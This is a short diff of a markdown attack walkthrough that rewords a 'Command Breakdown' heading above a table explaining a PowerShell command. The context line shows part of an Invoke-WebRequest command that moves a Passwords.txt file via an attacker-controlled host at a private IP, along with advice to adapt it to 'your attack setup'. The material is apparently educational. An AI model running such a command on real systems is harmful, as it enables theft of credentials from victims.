@@ -147,9 +147,7 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 # ⚠️ Make sure to change the IP address, port number, and file path to match your attack setup.
 ```
 
-### Command Breakdown
-See the table below for a breakdown of each part of the command.
-
+### Command Breakdown below 
 | Component            | Purpose                                                   |
 |----------------------|-----------------------------------------------------------|
 | `powershell -c`      | Runs the command within PowerShell                        |
